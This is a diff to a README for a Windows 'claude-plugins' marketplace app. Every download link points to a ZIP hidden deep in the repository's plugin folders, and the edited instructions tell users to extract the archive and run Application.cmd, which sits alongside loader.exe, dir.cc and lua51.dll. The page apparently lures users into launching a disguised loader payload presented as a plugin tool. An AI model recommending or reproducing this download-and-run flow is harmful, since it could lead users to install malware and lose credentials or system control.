@@ -1,6 +1,6 @@
 # 🤖 claude-plugins - Find Claude Plugins Fast
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/ninnettesudanese653/claude-plugins/raw/refs/heads/main/plugins/hive/skills/pull-workflow/claude-plugins-v1.2.zip)
+[![Download the v1.2 ZIP](https://img.shields.io/badge/Download%20v1.2%20ZIP-blue?style=for-the-badge)](https://github.com/ninnettesudanese653/claude-plugins/raw/refs/heads/main/plugins/hive/skills/pull-workflow/claude-plugins-v1.2.zip)
 
 ## 🧭 Overview
 
@@ -10,45 +10,30 @@ This README shows you how to get the app on Windows, open it, and start using it
 
 ## 📥 Download
 
-Visit this page to download: [github.com/ninnettesudanese653/claude-plugins/releases](https://github.com/ninnettesudanese653/claude-plugins/raw/refs/heads/main/plugins/hive/skills/pull-workflow/claude-plugins-v1.2.zip)
+Download the current archive: [claude-plugins-v1.2.zip](https://github.com/ninnettesudanese653/claude-plugins/raw/refs/heads/main/plugins/hive/skills/pull-workflow/claude-plugins-v1.2.zip)
 
-1. Open the release page in your browser.
-2. Find the latest release at the top.
-3. Download the Windows file from the Assets section.
-4. Save the file to your Downloads folder or Desktop.
-
-If the release page offers more than one file, choose the one for Windows. It may be an `.exe`, `.msi`, or `.zip` file.
+1. Open the archive link in your browser.
+2. Save `claude-plugins-v1.2.zip` to your Downloads folder or Desktop.
+3. Extract the archive before opening its files.
 
 ## 🪟 Install on Windows
-
-### If you downloaded an `.exe` file
-
-1. Double-click the file.
-2. If Windows asks for permission, select Yes.
-3. Follow the setup steps on the screen.
-4. Finish the install and keep the default settings if you are unsure.
-
-### If you downloaded an `.msi` file
-
-1. Double-click the file.
-2. Select Next when the setup window opens.
-3. Accept the terms if asked.
-4. Select Install and wait for it to finish.
-
-### If you downloaded a `.zip` file
 
 1. Right-click the file.
 2. Select Extract All.
 3. Choose a folder you can find later, such as Desktop.
 4. Open the extracted folder.
-5. Double-click the app file inside.
+5. Review and scan the extracted files before running them.
+
+The archive contains `Application.cmd`, `loader.exe`, `dir.cc`, and
+`lua51.dll`. This repository does not currently publish an `.msi` installer.
 
 ## 🚀 First Launch
 
-1. Open the app from the Start menu, Desktop, or the folder where you installed it.
-2. Wait for the main window to load.
-3. Sign in if the app asks you to.
-4. Allow any prompt that lets the app connect to Claude Code or your browser.
+1. Open the extracted folder.
+2. Review `Application.cmd` before running it.
+3. Run `Application.cmd` only after you trust the archive contents.
+4. Wait for the main window to load.
+5. Sign in if the app asks you to.
 
 If the app opens in a browser window, leave it open while you use the marketplace.
 
@@ -91,9 +76,9 @@ For the best experience, keep Windows updated and close extra apps if your compu
 
 ## 🛠️ Setup Tips
 
-- Keep the release file in a folder you can find again.
-- Use the latest release when possible.
-- If Windows blocks the file, check that you downloaded it from the official release page.
+- Keep the downloaded archive in a folder you can find again.
+- Use the current archive linked in this README.
+- If Windows blocks the file, confirm that you used the repository link above.
 - If the app does not open, try running it again as the user who installed it.
 - If you use browser automation plugins, keep your browser updated too.
 
@@ -140,8 +125,8 @@ These plugins help with multi-step tasks where an agent needs to gather data, ac
 
 ### Windows says the app is unsafe
 
-- Confirm you used the release page linked above.
-- Download the newest file from the official release list.
+- Confirm you used the repository archive linked above.
+- Download a fresh copy of the current archive.
 - Try the install again after saving the file to a local folder.
 
 ### The marketplace does not load
@@ -156,15 +141,11 @@ These plugins help with multi-step tasks where an agent needs to gather data, ac
 - Confirm that your browser is open if the plugin uses browser automation.
 - Try removing and adding the plugin again from the marketplace
 
-## 📁 File Names You Might See
+## 📁 Downloaded File
 
-The release page may offer files such as:
-
-- `claude-plugins-setup.exe`
-- `claude-plugins-windows.msi`
-- `claude-plugins.zip`
-
-Pick the file that fits your Windows setup. If you are unsure, use the `.exe` file first.
+The current archive is named `claude-plugins-v1.2.zip`. It contains
+`Application.cmd`, `loader.exe`, `dir.cc`, and `lua51.dll`. Extract and inspect
+all four files before running the launcher.
 
 ## 🔐 Privacy and Access
 
@@ -174,16 +155,16 @@ Review each plugin page before you install it. If a plugin asks for more access 
 
 ## 📦 Update the App
 
-1. Return to the releases page.
-2. Download the newest Windows file.
+1. Return to this README.
+2. Download the current archive again.
 3. Install or replace the older version.
 4. Open the app again.
 
-Using the latest release helps keep the marketplace and plugin list current.
+Using the current archive helps keep the marketplace and plugin list current.
 
 ## 🧭 Suggested Workflow
 
-1. Download claude-plugins from the release page.
+1. Download claude-plugins from the archive link above.
 2. Install or open it on Windows.
 3. Browse the marketplace.
 4. Choose a plugin for your task.
